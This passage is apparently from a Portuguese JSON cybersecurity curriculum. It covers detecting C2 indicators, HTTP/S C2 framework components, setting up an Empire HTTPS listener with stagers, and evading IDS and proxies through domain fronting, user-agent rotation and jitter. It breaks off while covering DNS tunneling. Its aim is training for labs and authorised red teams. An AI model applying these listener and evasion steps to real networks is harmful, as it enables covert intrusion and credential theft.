                                  "materials": [
                                    "Blue Team Handbook (capítulos sobre C2)",
                                    "Documentação MITRE ATT&CK (TA0011 - C2)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Foquem em IOCs de rede primeiro, pois são mais detectáveis em logs iniciais.",
                                  "learningObjective": "Identificar e categorizar IOCs típicos em canais C2 conforme padrões do Blue Team Handbook.",
                                  "commonMistakes": [
                                    "Confundir IOCs com IOAs (Indicators of Attack)",
                                    "Ignorar variações contextuais como user-agents legítimos em bots benignos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ferramentas para Captura e Análise de Tráfego",
                                  "subSteps": [
                                    "Instale e configure Wireshark ou Zeek para captura de pacotes em uma VM isolada.",
                                    "Configure regras em Suricata para alertas de user-agents suspeitos e domínios DGA.",
                                    "Gere tráfego simulado usando ferramentas como Atomic Red Team para C2 (ex: empire-http-profile).",
                                    "Importe PCAPs públicos de IOCs C2 (ex: de Malware-Traffic-Analysis.net).",
                                    "Crie dashboards iniciais no Zeek ou ELK Stack para visualizar padrões de tráfego."
                                  ],
                                  "verification": "Captura bem-sucedida de tráfego simulado com pelo menos 3 IOCs visíveis nos logs.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Wireshark/Zeek instalado",
                                    "PCAPs de amostra (ex: https://www.netresec.com)",
                                    "Suricata ruleset para C2"
                                  ],
                                  "tips": "Use filtros Wireshark como 'http.user_agent contains \"custom-malware\"' para agilizar.",
                                  "learningObjective": "Configurar ambiente de análise para detectar IOCs em tráfego de rede C2.",
                                  "commonMistakes": [
                                    "Executar em rede real sem isolamento (risco de infecção)",
                                    "Ignorar fusos horários em timestamps de beaconing"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar e Detectar IOCs em Dados de Tráfego",
                                  "subSteps": [
                                    "Examine user-agents em logs HTTP: filtre por strings não-browser (ex: Python/urllib).",
                                    "Detecte domínios DGA usando ferramentas como DGA-Detect ou padrões de entropia alta em DNS queries.",
                                    "Identifique padrões de tráfego: intervalos beaconing (ex: requests a cada 60s), volume anômalo para IPs novos.",
                                    "Correlacione IOCs: user-agent suspeito + destino DGA + beaconing = alto score de confiança.",
                                    "Documente achados em formato MITRE: mapear para T1071 (C2 Protocol).",
                                    "Teste falsos positivos com tráfego legítimo (ex: CDN bots)."
                                  ],
                                  "verification": "Relatório de análise identificando 4+ IOCs em um PCAP com evidências screenshot.",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "PCAPs com C2 real (ex: Cobalt Strike samples)",
                                    "Ferramentas: Wireshark, dga_detector.py",
                                    "ELK ou Splunk free"
                                  ],
                                  "tips": "Use scripts Python com Scapy para automação de detecção de beaconing.",
                                  "learningObjective": "Aplicar técnicas de análise para detectar IOCs específicos em canais C2 reais.",
                                  "commonMistakes": [
                                    "Focar apenas em um IOC ignorando correlações",
                                    "Não validar com múltiplas fontes de dados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Preparar Análise para Threat Hunting",
                                  "subSteps": [
                                    "Crie hipóteses de hunt baseadas em IOCs detectados (ex: 'Procure beaconing para domínios DGA nos últimos 7 dias').",
                                    "Integre IOCs em SIEM queries (ex: Splunk SPL para user-agents anômalos).",
                                    "Simule resposta: isole hosts, bloqueie IOCs em firewall.",
                                    "Documente playbook de detecção C2 para Blue Team.",
                                    "Avalie efetividade: rode simulação end-to-end e meça tempo de detecção."
                                  ],
                                  "verification": "Playbook completo com 3 hunts acionáveis e teste bem-sucedido.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "SIEM trial (Splunk/QRadar)",
                                    "Templates MITRE Hunt",
                                    "Firewall simulado (pfSense VM)"
                                  ],
                                  "tips": "Priorize IOCs de alta confiança para hunts iniciais.",
                                  "learningObjective": "Transformar detecção de IOCs em ações de threat hunting proativas.",
                                  "commonMistakes": [
                                    "Criar hunts muito amplos (muitos falsos positivos)",
                                    "Não incluir métricas de sucesso no playbook"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um incidente real, analise logs de um servidor web comprometido: detecte user-agent 'Mozilla/5.0 (compatible; MSIE 9.0)' em requests para domínios como 'x7k9p2m.ru' (DGA-like) a cada 5 minutos, correlacione com DNS queries anômalos e isole o host via EDR.",
                              "finalVerifications": [
                                "Lista precisa de 8 IOCs C2 com exemplos de malwares.",
                                "Análise de PCAP identificando 5+ anomalias com evidências.",
                                "Playbook de threat hunt executável em SIEM.",
                                "Diferenciação correta entre IOCs de rede, host e behavioral.",
                                "Simulação de resposta a C2 detectado sem erros.",
                                "Mapeamento de IOCs para táticas MITRE ATT&CK."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de IOCs (90%+ em testes com PCAPs).",
                                "Profundidade da análise: correlação de múltiplos IOCs.",
                                "Eficiência temporal: detecção em <30min em simulações.",
                                "Qualidade da documentação: clara, acionável e referenciada.",
                                "Capacidade de mitigar falsos positivos.",
                                "Integração com threat hunting workflows."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de protocolos (HTTP/DNS) e padrões de tráfego.",
                                "Forense Digital: Extração de IOCs de memória e logs.",
                                "Inteligência de Ameaças: Mapeamento MITRE ATT&CK.",
                                "Programação: Scripts Python para automação de detecção.",
                                "Gestão de Incidentes: Resposta Blue Team."
                              ],
                              "realWorldApplication": "Em um SOC Tier 2, use essa skill para pivotar de alertas de firewall para hunts completos, detectando APTs persistentes via C2 beaconing, reduzindo MTTD (Mean Time to Detect) em 40% durante red team exercises."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.4",
                    "name": "Arquiteturas e Protocolos de C2",
                    "description": "Estruturas como HTTP/S, DNS tunneling e C2 peer-to-peer para persistência e evasão de detecção.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.4.1",
                        "name": "Arquiteturas C2 baseadas em HTTP/S",
                        "description": "Arquiteturas de Comando e Controle (C2) que utilizam protocolos HTTP e HTTPS para mascarar comunicações maliciosas como tráfego web legítimo, permitindo persistência em redes comprometidas e evasão de detecção por ferramentas de segurança tradicionais.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.1.1",
                            "name": "Identificar componentes de um framework C2 HTTP/S",
                            "description": "Reconhecer e descrever os principais componentes de frameworks como Covenant ou Sliver que utilizam HTTP/S para C2, incluindo listeners, implants e perfis de comunicação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Básicos de C2 HTTP/S",
                                  "subSteps": [
                                    "Defina o que é C2 (Command and Control) em contextos de segurança cibernética.",
                                    "Explique como protocolos HTTP/S são usados para mascarar comunicações C2.",
                                    "Identifique frameworks comuns como Covenant e Sliver.",
                                    "Diferencie C2 HTTP/S de outros protocolos como DNS ou SMB.",
                                    "Revise arquitetura geral: servidor, agente e canal de comunicação."
                                  ],
                                  "verification": "Resuma em 3-5 frases os conceitos chave e liste 2 frameworks de exemplo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação oficial do Covenant (covenant.readthedocs.io)",
                                    "Documentação do Sliver (github.com/BishopFox/sliver)",
                                    "Artigo sobre C2 frameworks (ex: MITRE ATT&CK)"
                                  ],
                                  "tips": "Use diagramas para visualizar a arquitetura; foque em camadas de ofuscação HTTP/S.",
                                  "learningObjective": "Entender os fundamentos de C2 HTTP/S e seu propósito em simulações de ataque.",
                                  "commonMistakes": [
                                    "Confundir C2 com comunicação normal HTTP",
                                    "Ignorar a importância da ofuscação em HTTPS"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Componente: Listeners",
                                  "subSteps": [
                                    "Descreva a função do listener como ponto de escuta no servidor C2.",
                                    "Identifique configurações típicas: portas (80/443), perfis HTTP/S.",
                                    "Estude exemplos em Covenant (HTTP Listener) e Sliver (HTTP Listener).",
                                    "Examine parâmetros como User-Agent, URIs customizados e certificados TLS.",
                                    "Simule configuração básica em ambiente controlado (não execute)."
                                  ],
                                  "verification": "Desenhe um diagrama do listener e liste 4 parâmetros chave.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Repositório GitHub Covenant/Sliver",
                                    "Ferramenta de diagramação como Draw.io",
                                    "Wireshark para análise de tráfego exemplo"
                                  ],
                                  "tips": "Compare listeners de Covenant vs Sliver para destacar semelhanças/diferenças.",
                                  "learningObjective": "Reconhecer e descrever o papel e configurações de listeners em frameworks C2.",
                                  "commonMistakes": [
                                    "Achar que listener é o implant",
                                    "Ignorar suporte a múltiplos perfis"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Componente: Implants/Grunts/Agents",
                                  "subSteps": [
                                    "Defina implants como agentes implantados no host alvo.",
                                    "Descreva geração em Covenant (Grunt) e Sliver (Implant).",
                                    "Analise payloads: shells interativos, beacons, comunicação assíncrona.",
                                    "Identifique características: stagers, loaders, evasão de AV.",
                                    "Revise comunicação com listener via HTTP/S callbacks."
                                  ],
                                  "verification": "Liste 5 características de um implant e explique seu ciclo de vida.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Wiki Covenant Grunt",
                                    "Sliver Implant docs",
                                    "Exemplos de payloads em repositórios públicos"
                                  ],
                                  "tips": "Pense em detecção: busque por beacons periódicos em tráfego HTTP.",
                                  "learningObjective": "Identificar funções e comportamentos de implants em C2 HTTP/S.",
                                  "commonMistakes": [
                                    "Confundir implant com listener",
                                    "Subestimar persistência e evasão"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar Perfis de Comunicação e Integração",
                                  "subSteps": [
                                    "Explique perfis como templates de tráfego HTTP/S (headers, body, métodos).",
                                    "Analise perfis default e customizados em Covenant/Sliver.",
                                    "Descreva fluxo: beaconing, tasking, exfiltração via HTTP POST/GET.",
                                    "Identifique outros componentes: proxies, Malleable C2 profiles.",
                                    "Integre conceitos: como listener, implant e perfil formam o framework."
                                  ],
                                  "verification": "Crie um fluxograma de comunicação C2 completa.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Malleable C2 Profiles repo",
                                    "Exemplos de tráfego PCAP de Covenant",
                                    "Ferramentas como tcpdump"
                                  ],
                                  "tips": "Use PCAPs públicos para visualizar perfis reais sem gerar tráfego.",
                                  "learningObjective": "Compreender como perfis conectam componentes em operações C2.",
                                  "commonMistakes": [
                                    "Ignorar variação em perfis para evasão",
                                    "Não ligar perfis aos componentes"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Identificação em Cenários Simulados",
                                  "subSteps": [
                                    "Analise logs/tráfego de exemplos públicos de Covenant/Sliver.",
                                    "Identifique componentes em descrições de IOCs (Indicators of Compromise).",
                                    "Monte um checklist para detecção: listener ports, implant beacons, perfil signatures.",
                                    "Simule análise em Wireshark com PCAPs de C2 HTTP/S.",
                                    "Documente achados em relatório curto."
                                  ],
                                  "verification": "Produza um relatório identificando componentes em um PCAP exemplo.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "PCAPs públicos de C2 (ex: covenant-pcap em GitHub)",
                                    "Wireshark",
                                    "MITRE ATT&CK C2 framework matrix"
                                  ],
                                  "tips": "Filtre por User-Agents suspeitos e URIs longos/obfuscados.",
                                  "learningObjective": "Aplicar conhecimento para identificar componentes em cenários reais.",
                                  "commonMistakes": [
                                    "Focar só em IPs, ignorar payloads HTTP",
                                    "Não validar com múltiplas fontes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de red teaming ético, você captura tráfego Wireshark mostrando requisições HTTP POST para /agent.html com User-Agent customizado 'Covenant/Grunt'. Identifique: Listener na porta 80 com perfil HTTP default, Implant (Grunt) beaconing a cada 60s, e perfil usando JSON no body para tasking.",
                              "finalVerifications": [
                                "Lista e descreve com precisão listeners, implants e perfis de pelo menos 2 frameworks.",
                                "Explica o fluxo de comunicação C2 HTTP/S do implant ao listener.",
                                "Identifica componentes em um exemplo de tráfego ou log fornecido.",
                                "Diferencia Covenant de Sliver em termos de componentes chave.",
                                "Cria diagrama completo da arquitetura C2 HTTP/S.",
                                "Reconhece IOCs típicos para cada componente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de funções de cada componente (90%+ acurácia).",
                                "Profundidade nos substeps e exemplos práticos fornecidos.",
                                "Capacidade de integrar componentes em fluxos completos.",
                                "Uso correto de terminologia de frameworks específicos.",
                                "Criatividade em verificações e detecção de cenários simulados.",
                                "Ausência de confusões comuns entre componentes."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de protocolos HTTP/S e TLS (Networking).",
                                "Programação: Desenvolvimento de payloads em C#/Go (Linguagens de Programação).",
                                "Análise Forense: Detecção via Wireshark/PCAP (Investigação Digital).",
                                "Inteligência de Ameaças: Mapeamento a MITRE ATT&CK T1071 (Threat Intel).",
                                "Ética em Cibersegurança: Uso em red teaming/blue teaming (Ética Profissional)."
                              ],
                              "realWorldApplication": "Durante resposta a incidentes, analistas de SOC usam esse conhecimento para detectar frameworks C2 como Covenant em tráfego de rede, bloqueando listeners e identificando implants em endpoints comprometidos, prevenindo escalada em ataques reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.2",
                            "name": "Configurar um listener C2 HTTP/S",
                            "description": "Configurar um servidor listener utilizando ferramentas como Empire ou Cobalt Strike para receber comandos via HTTP/S, incluindo configuração de certificados SSL para HTTPS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Inicializar o Framework Empire",
                                  "subSteps": [
                                    "Baixe o repositório Empire do GitHub oficial usando git clone.",
                                    "Instale as dependências Python necessárias com pip install -r requirements.txt.",
                                    "Inicie o servidor Empire executando ./empire com privilégios adequados.",
                                    "Verifique o status do servidor acessando a interface Stager ou Listener no cliente.",
                                    "Configure autenticação básica no arquivo de configuração do Empire."
                                  ],
                                  "verification": "Comando './empire' inicia sem erros e a interface web ou CLI responde.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Máquina Linux (Kali ou Ubuntu)",
                                    "Git",
                                    "Python 3",
                                    "pip"
                                  ],
                                  "tips": "Use uma VM isolada para evitar conflitos; execute como root apenas se necessário.",
                                  "learningObjective": "Entender a instalação e inicialização de frameworks C2 para operações controladas.",
                                  "commonMistakes": [
                                    "Ignorar dependências Python levando a falhas de import",
                                    "Executar em ambiente não isolado expondo a rede",
                                    "Esquecer de configurar firewall para portas padrão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar e Configurar Certificados SSL/TLS",
                                  "subSteps": [
                                    "Gere um certificado auto-assinado usando openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365.",
                                    "Converta o certificado para formato compatível com Empire (PKCS12 ou PEM).",
                                    "Copie os arquivos cert.pem e key.pem para o diretório de configuração do Empire (/empire/server/data/).",
                                    "Edite o arquivo de configuração do listener para apontar para os certificados.",
                                    "Teste a validade do certificado com openssl x509 -in cert.pem -text -noout."
                                  ],
                                  "verification": "Certificado gerado é válido por 365 dias e sem erros de parsing.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Editor de texto (nano/vim)"
                                  ],
                                  "tips": "Para produção, use Let's Encrypt ou CA interna; auto-assinado é ok para labs.",
                                  "learningObjective": "Dominar geração e integração de certificados SSL para comunicações seguras em C2.",
                                  "commonMistakes": [
                                    "Chaves mismatched entre cert e key",
                                    "Formato de arquivo incorreto (não PEM)",
                                    "Esquecer de definir Hostname no CSR"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar o Listener HTTP/S no Empire",
                                  "subSteps": [
                                    "No cliente Empire, execute 'listeners' para listar e 'uselistener http' ou 'https'.",
                                    "Defina parâmetros: Host (0.0.0.0), Port (80/443), UserAgent, Headers customizados.",
                                    "Ative SSL com 'set CertPath /path/to/cert.pem' e 'set KeyPath /path/to/key.pem'.",
                                    "Execute 'execute' ou 'start' para lançar o listener.",
                                    "Monitore logs com 'info' para confirmar status 'Running'."
                                  ],
                                  "verification": "Comando 'listeners' mostra listener HTTP/S como 'running' com SSL enabled.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Cliente Empire ativo",
                                    "Certificados gerados"
                                  ],
                                  "tips": "Use portas não padrão para evasão; configure WorkingHours para realismo.",
                                  "learningObjective": "Configurar listeners C2 com protocolos HTTP/S para simular comunicações stealth.",
                                  "commonMistakes": [
                                    "Portas em uso sem verificação netstat",
                                    "SSL não ativado levando a fallback HTTP",
                                    "Headers vazios facilitando detecção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar o Listener C2",
                                  "subSteps": [
                                    "Gere um stager HTTP/S com 'stagers > multi > http > set Listener http > execute'.",
                                    "Execute o stager em uma VM alvo e verifique conexão no Empire ('agents').",
                                    "Teste comandos básicos: shell, whoami, download/upload arquivos.",
                                    "Monitore tráfego com Wireshark para confirmar HTTPS e ausência de plaintext.",
                                    "Pare o listener com 'kill' e reinicie para validar persistência de config."
                                  ],
                                  "verification": "Agente conecta com sucesso e responde a comandos via HTTPS.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "VM alvo isolada",
                                    "Wireshark",
                                    "Browser para testar endpoint"
                                  ],
                                  "tips": "Use curl -k https://your-ip:443/ para simular beacon sem stager.",
                                  "learningObjective": "Validar funcionalidade end-to-end de listeners C2 em cenários simulados.",
                                  "commonMistakes": [
                                    "Firewall bloqueando portas de entrada",
                                    "Certificado não trusted no alvo",
                                    "Stager com listener name incorreto"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team, configure um listener HTTPS na porta 8443 em um servidor Kali. Gere stager para Windows, execute em VM Windows alvo infectada. Envie comandos para dump de hashes via shell, simulando exfiltração de credenciais em uma rede corporativa simulada.",
                              "finalVerifications": [
                                "Listener inicia sem erros e status 'running' com SSL ativado.",
                                "Certificado SSL é válido e handshake HTTPS bem-sucedido.",
                                "Stager conecta de máquina remota e agente aparece na lista.",
                                "Comandos básicos (shell, sysinfo) executam sem falhas.",
                                "Tráfego capturado mostra apenas HTTPS criptografado.",
                                "Listener persiste após restart do framework."
                              ],
                              "assessmentCriteria": [
                                "Configuração completa sem erros de sintaxe ou runtime (100%).",
                                "Tempo total dentro de 4 horas com documentação de passos.",
                                "Evasão básica: UserAgent rotativo e headers customizados implementados.",
                                "Testes incluem cenários de falha (ex: sem SSL) e recuperação.",
                                "Relatório inclui screenshots de logs, tráfego e agente conectado.",
                                "Segurança: Nenhuma exposição desnecessária (firewall, isolamento)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de protocolos HTTP/2, TLS 1.3 e proxies.",
                                "Criptografia: Geração de keys assimétricas e chain of trust.",
                                "Programação: Scripts Python para automação de listeners.",
                                "Defesa Cibernética: Detecção de C2 via EDR/SIEM (YARA rules).",
                                "Ética: Discussão de uso legal em ops autorizadas."
                              ],
                              "realWorldApplication": "Em operações de Red Teaming autorizadas ou Purple Team exercises, configurar listeners HTTP/S permite simular comunicações de malware APT como Cobalt Strike em avaliações de penetração, ajudando equipes de defesa a detectar e mitigar C2 channels em ambientes empresariais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.3",
                            "name": "Implementar evasão de detecção em tráfego HTTP/S",
                            "description": "Aplicar técnicas como domain fronting, user-agent rotation e jittering para ofuscar beacons C2 e evitar detecção por IDS/IPS e proxies.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Domain Fronting para Ofuscação de Domínio",
                                  "subSteps": [
                                    "Pesquise e identifique CDNs compatíveis com domain fronting, como CloudFront ou Fastly.",
                                    "Configure um servidor C2 hospedado em um subdomínio legítimo (ex: benigno.cloudfront.net) apontando para o IP real do C2.",
                                    "Modifique o cabeçalho Host no cliente para usar o domínio da CDN enquanto o SNI permanece o domínio legítimo.",
                                    "Teste a resolução DNS e conectividade inicial sem payloads.",
                                    "Implemente fallback para domínios alternativos em caso de bloqueio."
                                  ],
                                  "verification": "Verifique logs de proxy ou Wireshark mostrando tráfego roteado via CDN sem exposição do domínio C2 real.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Conta em CDN (AWS CloudFront), Wireshark, servidor C2 (ex: Covenant ou Empire).",
                                  "tips": "Use domínios de alta reputação para maximizar sucesso; monitore mudanças em políticas de CDN.",
                                  "learningObjective": "Compreender como domain fronting explora diferenças entre SNI e Host header para evasão.",
                                  "commonMistakes": "Confundir SNI com Host header; não testar contra proxies que inspecionam ambos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Rotação de User-Agent",
                                  "subSteps": [
                                    "Compile uma lista de 20+ user-agents comuns de browsers legítimos (Chrome, Firefox, mobile).",
                                    "Crie uma função randômica no beacon C2 para selecionar e rotacionar user-agent a cada beacon ou sessão.",
                                    "Integre rotação com headers adicionais como Accept, Referer para maior realismo.",
                                    "Teste em loop para garantir variação sem padrões detectáveis.",
                                    "Adicione persistência para reutilizar user-agents por IP ou sessão longa."
                                  ],
                                  "verification": "Capture tráfego com tcpdump e confirme user-agents variando em beacons consecutivos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Lista de user-agents (de whatismybrowser.com), editor de código (Python/Go para beacon), tcpdump.",
                                  "tips": "Rotacione baseado em seed temporal para imprevisibilidade; evite user-agents obsoletos.",
                                  "learningObjective": "Aplicar randomização de headers para imitar tráfego benigno e evitar assinaturas estáticas.",
                                  "commonMistakes": "Usar o mesmo user-agent por default; ignorar combinações inconsistentes com outros headers."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adicionar Jittering e Randomização de Timing",
                                  "subSteps": [
                                    "Defina intervalos de beacon base (ex: 60s) e aplique jitter de ±30-50% usando distribuição uniforme ou gaussiana.",
                                    "Implemente delays randômicos em requisições HTTP (ex: sleep(random(1,5)) segundos).",
                                    "Combine com burst avoidance: limite taxa máxima de beacons por minuto.",
                                    "Teste em ambiente controlado medindo intervalos com Wireshark.",
                                    "Ajuste parâmetros baseados em análise de tráfego normal de aplicações web."
                                  ],
                                  "verification": "Analise capturas de pacotes mostrando intervalos irregulares sem padrões periódicos.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Bibliotecas randômicas (random em Python), Wireshark para timing analysis.",
                                  "tips": "Use jitter assimétrico para simular comportamento humano; monitore impacto na responsividade C2.",
                                  "learningObjective": "Evitar detecção baseada em behavioral analysis através de randomização temporal.",
                                  "commonMistakes": "Jitter excessivo causando timeouts; não calibrar para redes lentas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Técnicas em Beacon C2 e Testar Evasão",
                                  "subSteps": [
                                    "Modifique o código do beacon para combinar domain fronting, user-agent rotation e jittering.",
                                    "Configure um ambiente de teste com IDS/IPS simulado (ex: Snort rules para C2 HTTP).",
                                    "Deploy beacon em VM vítima e monitore detecções vs. tráfego baseline.",
                                    "Itere ajustes baseados em alertas gerados.",
                                    "Documente métricas de sucesso (taxa de detecção <5%)."
                                  ],
                                  "verification": "Execute 100+ beacons sem alertas em IDS simulado; compare com baseline sem evasão.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Framework C2 (Sliver, Merlin), Snort/Suricata, VMs para simulação.",
                                  "tips": "Teste contra regras reais de threat intel (ex: MITRE ATT&CK T1071); use VPN para isolamento.",
                                  "learningObjective": "Integrar múltiplas técnicas de evasão para robustez contra defesas multicamadas.",
                                  "commonMistakes": "Não isolar variáveis no teste; ignorar side-channels como TLS fingerprinting."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar e Validar Contra Proxies e WAFs",
                                  "subSteps": [
                                    "Teste contra proxies comuns (Zscaler, BlueCoat) simulados ou reais em lab.",
                                    "Adicione evasões extras como HTTP/2 multiplexing se suportado.",
                                    "Monitore e ajuste para deep packet inspection (DPI).",
                                    "Crie relatório com before/after evasion effectiveness.",
                                    "Planeje atualizações dinâmicas baseadas em IOCs emergentes."
                                  ],
                                  "verification": "Confirme conectividade C2 através de proxy sem bloqueios ou logs suspeitos.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Proxy test tools (Burp Suite, mitmproxy), WAF simulado (ModSecurity).",
                                  "tips": "Simule tráfego de produção; foque em low-and-slow para stealth.",
                                  "learningObjective": "Adaptar evasão para cenários reais de rede corporativa.",
                                  "commonMistakes": "Testar só localmente; subestimar JA3 fingerprinting."
                                }
                              ],
                              "practicalExample": "Em um exercício de red team, configure um beacon Merlin em Python: use domain fronting via CloudFront para 'legit-site.com', rotacione user-agents de uma lista de 50, aplique jitter de 60s ±40%. Deploy em VM Windows simulando endpoint comprometido. Teste contra Snort com rules para Cobalt Strike-like HTTP C2 – beacon persiste 24h sem detecção.",
                              "finalVerifications": [
                                "Tráfego C2 passa por IDS/IPS sem alertas em 95% dos casos.",
                                "Domain fronting resolve corretamente sem vazamento de IP C2.",
                                "User-agents variam em cada beacon com realismo estatístico.",
                                "Intervalos de timing mostram variância >30% sem padrões.",
                                "Conectividade bidirecional mantida através de proxy corporativo.",
                                "Nenhum TLS/HTTP fingerprint único detectável."
                              ],
                              "assessmentCriteria": [
                                "Precisão na implementação de cada técnica (código funcional e testado).",
                                "Eficácia medida por taxa de evasão em simulações (>90%).",
                                "Documentação clara de configuração e resultados.",
                                "Identificação e mitigação de erros comuns.",
                                "Criatividade em otimizações adicionais (ex: padding de payload).",
                                "Compreensão teórica demonstrada em explicação de mecanismos."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Análise de protocolos HTTP/S e TLS (Networking Fundamentals).",
                                "Programação: Scripting em Python/Go para automação de beacons (Software Development).",
                                "Criptografia: Fingerprinting TLS e ofuscação de payloads (Cryptography).",
                                "Análise de Malware: Comportamentos de C2 em amostras reais (Malware Analysis).",
                                "Defesa Cibernética: Desenvolvimento de signatures para detecção (IDS/IPS Rules)."
                              ],
                              "realWorldApplication": "Em operações de red teaming ou CTFs, essas técnicas permitem simular APTs persistentes, testando defesas corporativas sem detecção prematura. Usado por grupos como APT29 em campanhas reais para manter acesso furtivo em redes críticas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.4.2",
                        "name": "DNS Tunneling para C2",
                        "description": "Técnica de tunelamento de comandos e dados através de consultas DNS, explorando a permissão ubíqua de tráfego DNS para manter persistência e comunicação em ambientes com firewalls restritivos.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.2.1",
                            "name": "Entender o protocolo DNS para tunelamento",
                            "description": "Analisar como consultas TXT, NULL e CNAME são usadas para codificar payloads C2, incluindo limitações de tamanho de pacotes DNS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura básica do protocolo DNS",
                                  "subSteps": [
                                    "Estude o formato de uma mensagem DNS: header (ID, flags, questions, answers, authority, additional)",
                                    "Analise a seção Question: name, type, class",
                                    "Revise a seção Answer: resource records com name, type, class, TTL, RDATA",
                                    "Leia RFC 1035 para detalhes sobre queries e responses",
                                    "Identifique como DNS opera sobre UDP/TCP porta 53"
                                  ],
                                  "verification": "Desenhe um diagrama da estrutura de uma mensagem DNS e rotule todas as seções principais",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 1035 (disponível online)",
                                    "Wireshark para capturar tráfego DNS real",
                                    "Documentação IANA sobre tipos DNS"
                                  ],
                                  "tips": "Use Wireshark para capturar suas próprias queries DNS diárias e dissecá-las",
                                  "learningObjective": "Dominar os componentes fundamentais de uma mensagem DNS para entender modificações em tunelamento",
                                  "commonMistakes": [
                                    "Confundir UDP com TCP em DNS",
                                    "Ignorar o limite de 512 bytes em UDP sem EDNS",
                                    "Não diferenciar query de response"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar registros DNS TXT, NULL e CNAME para tunelamento",
                                  "subSteps": [
                                    "Defina e estude registro TXT: permite dados arbitrários como texto (até 255 bytes por string)",
                                    "Analise registro NULL (tipo 10): payload opaco sem interpretação pelo servidor DNS",
                                    "Revise registro CNAME: alias de domínio, útil para encadear domínios em tunelamento",
                                    "Compare tamanhos e usos: TXT para texto legível, NULL para binário, CNAME para redirecionamento",
                                    "Capture exemplos reais desses registros usando dig ou nslookup"
                                  ],
                                  "verification": "Execute comandos dig para TXT, NULL e CNAME em domínios públicos e explique saídas",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramentas: dig, nslookup, Wireshark",
                                    "Lista de domínios de teste como example.com",
                                    "Documentação RFC 1035 seção 3.3.14 para NULL"
                                  ],
                                  "tips": "Teste com domínios controlados para evitar ruído; foque em RDATA",
                                  "learningObjective": "Identificar como TXT, NULL e CNAME suportam dados não-padronizados para exfiltração",
                                  "commonMistakes": [
                                    "Achar que TXT é só para SPF/DKIM",
                                    "Ignorar que NULL é raramente suportado",
                                    "Confundir CNAME com redirects HTTP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar codificação de payloads C2 em consultas DNS",
                                  "subSteps": [
                                    "Aprenda técnicas de codificação: Base32/Base64 para payloads em subdomínios de queries",
                                    "Estude como queries TXT/NULL enviam comandos C2: cliente codifica payload no nome do subdomínio",
                                    "Examine responses: servidor C2 decodifica e responde via RDATA em TXT/NULL/CNAME",
